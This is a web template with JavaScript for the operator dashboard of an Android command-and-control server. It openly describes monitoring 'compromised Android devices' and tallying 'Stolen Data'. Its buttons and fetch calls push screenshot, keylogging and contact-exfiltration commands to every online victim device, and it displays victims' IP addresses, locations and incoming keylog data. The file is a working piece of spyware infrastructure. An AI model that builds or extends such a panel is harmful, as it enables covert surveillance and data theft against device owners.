{% extends "base.html" %}

{% block title %}C2 Dashboard - Command Center{% endblock %}

{% block content %}
<div class="row mb-4">
    <div class="col-12">
        <h1><i class="fas fa-tachometer-alt"></i> Command & Control Dashboard</h1>
        <p class="text-muted">Real-time monitoring and control of compromised Android devices</p>
    </div>
</div>

<!-- Statistics Cards -->
<div class="row mb-4">
    <div class="col-md-3">
        <div class="card stats-card">
            <div class="card-body text-center">
                <i class="fas fa-mobile-alt fa-2x text-primary mb-2"></i>
                <h4 id="total-devices" class="text-primary">-</h4>
                <p class="card-text">Total Devices</p>
            </div>
        </div>
    </div>
    
    <div class="col-md-3">
        <div class="card stats-card">
            <div class="card-body text-center">
                <i class="fas fa-circle fa-2x text-success mb-2"></i>
                <h4 id="online-devices" class="text-success">-</h4>
                <p class="card-text">Online Devices</p>
            </div>
        </div>
    </div>
    
    <div class="col-md-3">
        <div class="card stats-card">
            <div class="card-body text-center">
                <i class="fas fa-database fa-2x text-warning mb-2"></i>
                <h4 id="data-size" class="text-warning">-</h4>
                <p class="card-text">Stolen Data</p>
            </div>
        </div>
    </div>
    
    <div class="col-md-3">
        <div class="card stats-card">
            <div class="card-body text-center">
                <i class="fas fa-terminal fa-2x text-info mb-2"></i>
                <h4 id="command-success" class="text-info">-</h4>
                <p class="card-text">Command Success</p>
            </div>
        </div>
    </div>
</div>

<!-- Real-time Activity -->
<div class="row">
    <div class="col-lg-8">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-activity"></i> Real-time Activity Feed</h5>
            </div>
            <div class="card-body">
                <div class="terminal" id="activity-feed">
                    <div class="log-entry">
                        <span class="log-timestamp">[{{ moment().format('YYYY-MM-DD HH:mm:ss') }}]</span>
                        <span class="log-content">C2 Server initialized - Waiting for device connections...</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <div class="col-lg-4">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-mobile-alt"></i> Active Devices</h5>
            </div>
            <div class="card-body">
                <div id="active-devices-list">
                    <p class="text-muted">Loading device information...</p>
                </div>
            </div>
        </div>
        
        <div class="card mt-3">
            <div class="card-header">
                <h5><i class="fas fa-exclamation-triangle"></i> Quick Actions</h5>
            </div>
            <div class="card-body">
                <button class="btn btn-danger btn-sm w-100 mb-2" onclick="sendGlobalCommand('screenshot')">
                    <i class="fas fa-camera"></i> Screenshot All Devices
                </button>
                <button class="btn btn-warning btn-sm w-100 mb-2" onclick="sendGlobalCommand('keylog_start')">
                    <i class="fas fa-keyboard"></i> Start Global Keylogging
                </button>
                <button class="btn btn-info btn-sm w-100 mb-2" onclick="sendGlobalCommand('exfiltrate_contacts')">
                    <i class="fas fa-address-book"></i> Harvest All Contacts
                </button>
                <button class="btn btn-secondary btn-sm w-100" onclick="refreshDashboard()">
                    <i class="fas fa-sync"></i> Refresh Dashboard
                </button>
            </div>
        </div>
    </div>
</div>

<!-- Device Quick View Modal -->
<div class="modal fade" id="deviceModal" tabindex="-1">
    <div class="modal-dialog modal-lg">
        <div class="modal-content bg-dark">
            <div class="modal-header">
                <h5 class="modal-title">Device Details</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body">
                <div id="device-details">
                    Loading device information...
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary" onclick="openDeviceManager()">Manage Device</button>
            </div>
        </div>
    </div>
</div>
{% endblock %}

{% block extra_js %}
<script>
let selectedDeviceId = null;

// Load dashboard data
function loadDashboardData() {
    // Load statistics
    fetch('/api/statistics')
        .then(response => response.json())
        .then(data => {
            document.getElementById('total-devices').textContent = data.devices.total;
            document.getElementById('online-devices').textContent = data.devices.online;
            document.getElementById('data-size').textContent = data.data.total_size_mb + ' MB';
            document.getElementById('command-success').textContent = data.commands.success_rate + '%';
        })
        .catch(error => {
            console.error('Error loading statistics:', error);
        });
    
    // Load devices
    loadActiveDevices();
}

function loadActiveDevices() {
    fetch('/api/devices')
        .then(response => response.json())
        .then(devices => {
            const devicesList = document.getElementById('active-devices-list');
            
            if (devices.length === 0) {
                devicesList.innerHTML = '<p class="text-muted">No devices connected</p>';
                return;
            }
            
            let html = '';
            devices.forEach(device => {
                const statusClass = device.status === 'online' ? 'text-success' : 'text-danger';
                const statusIcon = device.status === 'online' ? 'fa-circle' : 'fa-circle';
                
                html += `
                    <div class="d-flex justify-content-between align-items-center mb-2 p-2 border rounded cursor-pointer" 
                         onclick="showDeviceDetails('${device.device_id}')">
                        <div>
                            <strong>${device.device_name}</strong><br>
                            <small class="text-muted">${device.android_version}</small>
                        </div>
                        <div class="text-end">
                            <i class="fas ${statusIcon} ${statusClass}"></i><br>
                            <small class="text-muted">${formatTimestamp(device.last_seen)}</small>
                        </div>
                    </div>
                `;
            });
            
            devicesList.innerHTML = html;
        })
        .catch(error => {
            console.error('Error loading devices:', error);
            document.getElementById('active-devices-list').innerHTML = 
                '<p class="text-danger">Error loading devices</p>';
        });
}

function showDeviceDetails(deviceId) {
    selectedDeviceId = deviceId;
    
    fetch(`/api/devices`)
        .then(response => response.json())
        .then(devices => {
            const device = devices.find(d => d.device_id === deviceId);
            if (!device) {
                document.getElementById('device-details').innerHTML = 'Device not found';
                return;
            }
            
            const capabilities = Object.keys(device.capabilities).map(cap => 
                `<span class="badge bg-secondary me-1">${cap}</span>`
            ).join('');
            
            document.getElementById('device-details').innerHTML = `
                <div class="row">
                    <div class="col-md-6">
                        <h6>Device Information</h6>
                        <p><strong>ID:</strong> ${device.device_id}</p>
                        <p><strong>Name:</strong> ${device.device_name}</p>
                        <p><strong>Android:</strong> ${device.android_version}</p>
                        <p><strong>IP:</strong> ${device.ip_address}</p>
                        <p><strong>Location:</strong> ${device.location}</p>
                    </div>
                    <div class="col-md-6">
                        <h6>Status</h6>
                        <p><strong>Status:</strong> 
                            <span class="badge ${device.status === 'online' ? 'bg-success' : 'bg-danger'}">${device.status}</span>
                        </p>
                        <p><strong>First Seen:</strong> ${formatTimestamp(device.first_seen)}</p>
                        <p><strong>Last Seen:</strong> ${formatTimestamp(device.last_seen)}</p>
                        <h6>Capabilities</h6>
                        <p>${capabilities || '<span class="text-muted">None reported</span>'}</p>
                    </div>
                </div>
            `;
            
            const modal = new bootstrap.Modal(document.getElementById('deviceModal'));
            modal.show();
        })
        .catch(error => {
            console.error('Error loading device details:', error);
        });
}

function openDeviceManager() {
    if (selectedDeviceId) {
        window.location.href = `/devices?device=${selectedDeviceId}`;
    }
}

function sendGlobalCommand(command) {
    fetch('/api/devices')
        .then(response => response.json())
        .then(devices => {
            const onlineDevices = devices.filter(d => d.status === 'online');
            
            if (onlineDevices.length === 0) {
                showToast('No online devices to send command to', 'warning');
                return;
            }
            
            let commandsSent = 0;
            onlineDevices.forEach(device => {
                fetch(`/api/device/${device.device_id}/command`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        command: command,
                        parameters: '{}'
                    })
                })
                .then(response => response.json())
                .then(data => {
                    commandsSent++;
                    if (commandsSent === onlineDevices.length) {
                        showToast(`Command "${command}" sent to ${commandsSent} devices`, 'success');
                        addActivityLog(`Global command "${command}" sent to ${commandsSent} devices`);
                    }
                })
                .catch(error => {
                    console.error('Error sending command:', error);
                });
            });
        })
        .catch(error => {
            console.error('Error loading devices for global command:', error);
        });
}

function addActivityLog(message) {
    const feed = document.getElementById('activity-feed');
    const timestamp = new Date().toISOString().replace('T', ' ').substr(0, 19);
    
    const logEntry = document.createElement('div');
    logEntry.className = 'log-entry';
    logEntry.innerHTML = `
        <span class="log-timestamp">[${timestamp}]</span>
        <span class="log-content">${message}</span>
    `;
    
    feed.appendChild(logEntry);
    feed.scrollTop = feed.scrollHeight;
}

function refreshDashboard() {
    document.body.classList.add('loading');
    loadDashboardData();
    setTimeout(() => {
        document.body.classList.remove('loading');
        showToast('Dashboard refreshed', 'success');
    }, 1000);
}

// Real-time event handlers
socket.on('device_update', function(data) {
    loadActiveDevices();
    addActivityLog(`Device ${data.device_id} status: ${data.status}`);
});

socket.on('new_data', function(data) {
    loadDashboardData(); // Refresh statistics
    addActivityLog(`New ${data.data_type} data received from ${data.device_id} (${formatFileSize(data.size)})`);
});

socket.on('new_log', function(data) {
    addActivityLog(`${data.log_type} log from ${data.device_id}: ${data.content.substring(0, 100)}...`);
});

socket.on('new_command', function(data) {
    addActivityLog(`Command "${data.command}" executed on device`);
});

// Initialize dashboard
document.addEventListener('DOMContentLoaded', function() {
    loadDashboardData();
    
    // Refresh data every 30 seconds
    setInterval(loadDashboardData, 30000);
});
</script>
{% endblock %}
